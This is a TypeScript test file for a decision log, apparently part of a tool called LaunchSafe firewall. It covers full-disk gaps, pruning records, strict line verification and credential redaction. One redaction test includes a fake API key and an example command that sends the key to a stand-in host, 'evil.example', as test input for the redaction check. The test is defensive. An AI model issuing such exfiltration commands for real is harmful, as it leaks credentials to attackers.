/**
 * I5, I6, M2, M6: the decision log says when it could not record something and when old files were pruned;
 * its in-place verify reads lines as strictly as a bundle; and it never stores a credential or a URL's query
 * string in the free text it keeps about an action. Temporary homes only.
 */

import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { _setLogWriterForTest, appendLog, logHealthChecks, noteLogExported, readUnlogged, rotateNow, tailLog, verifyLog } from "../src/runtime/log.js";
import { appendDurable } from "../src/runtime/fsutil.js";
import { layout, type Layout } from "../src/runtime/layout.js";

process.env.LAUNCHSAFE_FIREWALL_TEST = "1";

let root: string;
let l: Layout;
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "lsfw-gap-"));
  l = layout(join(root, "home"));
});
afterEach(() => {
  _setLogWriterForTest(null);
  rmSync(root, { recursive: true, force: true });
});

const enospc = (): never => {
  const e = new Error("no space left on device") as NodeJS.ErrnoException;
  e.code = "ENOSPC";
  throw e;
};
const types = (): unknown[] => tailLog(l, 1000).map((e) => e.event.type);

describe("I5: a full disk", () => {
  it("keeps a reserve file, and an append that finds the disk full releases it and still lands", () => {
    appendLog(l, { type: "decision", n: 1 });
    expect(existsSync(join(l.log, "reserve.bin"))).toBe(true);
    let failed = false;
    _setLogWriterForTest((p, t) => {
      if (!failed) {
        failed = true;
        enospc();
      }
      appendDurable(p, t);
    });
    appendLog(l, { type: "decision", n: 2 });
    expect(types()).toEqual(["decision", "log_disk_full", "decision"]);
    expect(verifyLog(l).ok).toBe(true);
    // Recreated after the successful append.
    expect(existsSync(join(l.log, "reserve.bin"))).toBe(true);
  });

  it("decisions that cannot be logged are counted, doctor says so, and the next entry records the gap", () => {
    appendLog(l, { type: "decision", n: 1 });
    _setLogWriterForTest(() => enospc());
    expect(() => appendLog(l, { type: "decision", n: 2 })).toThrow(/no space/);
    expect(() => appendLog(l, { type: "decision", n: 3 })).toThrow(/no space/);
    expect(readUnlogged(l)).toMatchObject({ count: 2, types: { decision: 2 }, error: "ENOSPC" });
    expect(logHealthChecks(l).map((c) => c.detail).join("\n")).toMatch(/2 event\(s\) could not be logged/);
    _setLogWriterForTest(null);
    appendLog(l, { type: "decision", n: 4 });
    const gap = tailLog(l, 10).find((e) => e.event.type === "log_gap");
    expect(gap?.event).toMatchObject({ unlogged: 2, error: "ENOSPC" });
    expect(types()).toEqual(["decision", "log_gap", "decision"]);
    expect(readUnlogged(l)).toBeNull();
    expect(verifyLog(l).ok).toBe(true);
    expect(logHealthChecks(l).map((c) => c.detail).join("\n")).toMatch(/records 1 gap\(s\): 2 event\(s\) were not logged/);
  });
});

describe("I6: pruning", () => {
  function fill(files: number): void {
    for (let i = 0; i < files; i++) {
      appendLog(l, { type: "decision", n: i });
      rotateNow(l, 100);
    }
  }
  /** One more entry, then a rotation keeping at most `max` archives (a rotation needs a current file). */
  function pruneTo(max: number, keep = false): void {
    appendLog(l, { type: "decision", n: "rotated" });
    rotateNow(l, max, keep);
  }

  it("each pruned file is recorded as log_pruned by the next entry, and doctor warns when nothing exported it", () => {
    fill(3);
    pruneTo(1);
    appendLog(l, { type: "decision", n: "after" });
    const pruned = tailLog(l, 100).filter((e) => e.event.type === "log_pruned");
    expect(pruned.length).toBeGreaterThan(0);
    expect(pruned[0]?.event).toMatchObject({ unexported: true });
    expect(verifyLog(l).ok).toBe(true);
    const d = logHealthChecks(l).find((c) => c.name === "decision log pruning");
    expect(d).toMatchObject({ status: "warn" });
    expect(d?.detail).toMatch(/before any "log export" or "log anchor" covered/);
  });

  it("a file an export covered is pruned as exported", () => {
    fill(2);
    noteLogExported(l, tailLog(l, 1)[0]?.seq ?? 0);
    pruneTo(2);
    appendLog(l, { type: "decision", n: "after" });
    const pruned = tailLog(l, 100).filter((e) => e.event.type === "log_pruned");
    expect(pruned.length).toBeGreaterThan(0);
    expect(pruned.every((e) => e.event.unexported === false)).toBe(true);
  });

  it("with keepUnexported, a file nothing exported is kept past the limit", () => {
    fill(3);
    pruneTo(1, true);
    appendLog(l, { type: "decision", n: "after" });
    expect(tailLog(l, 100).some((e) => e.event.type === "log_pruned")).toBe(false);
    expect(tailLog(l, 1000).filter((e) => e.event.type === "decision").length).toBe(5);
    expect(logHealthChecks(l).some((c) => /are kept \(more than/.test(c.detail))).toBe(false);
  });
});

describe("M2: in-place verify reads lines strictly", () => {
  it("a line rewritten with extra spacing (same values) is reported", () => {
    appendLog(l, { type: "decision", n: 1 });
    const f = join(l.log, "decisions.jsonl");
    writeFileSync(f, readFileSync(f, "utf8").replace('{"seq":1,', '{"seq": 1,'));
    const v = verifyLog(l);
    expect(v.ok).toBe(false);
    expect(v.problems.join("\n")).toMatch(/not in canonical form/);
  });

  it("a duplicate key is reported", () => {
    appendLog(l, { type: "decision", n: 1 });
    const f = join(l.log, "decisions.jsonl");
    writeFileSync(f, readFileSync(f, "utf8").replace('{"seq":1,', '{"seq":1,"seq":1,'));
    expect(verifyLog(l).ok).toBe(false);
  });
});

describe("M6: what the log keeps about an action", () => {
  it("credentials are redacted and URL query strings removed from `what` and a spawned prompt's preview", () => {
    const key = "AKIA" + "Q3XJ7Z2LMB4WTY5R";
    appendLog(l, { type: "decision", what: `curl -H "x-api-key: ${key}" https://api.example.com/v1/items?token=s3cret&x=1`, spawned_prompt: { preview: `fetch https://evil.example/c?d=${key}`, chars: 40 } });
    const e = tailLog(l, 1)[0]?.event as { what: string; spawned_prompt: { preview: string; chars: number } };
    expect(e.what).not.toContain(key);
    expect(e.what).not.toContain("token=s3cret");
    expect(e.what).toContain("https://api.example.com/v1/items?…");
    expect(e.spawned_prompt.preview).not.toContain(key);
    expect(e.spawned_prompt.preview).toContain("https://evil.example/c?…");
    expect(e.spawned_prompt.chars).toBe(40);
    expect(verifyLog(l).ok).toBe(true);
  });
});
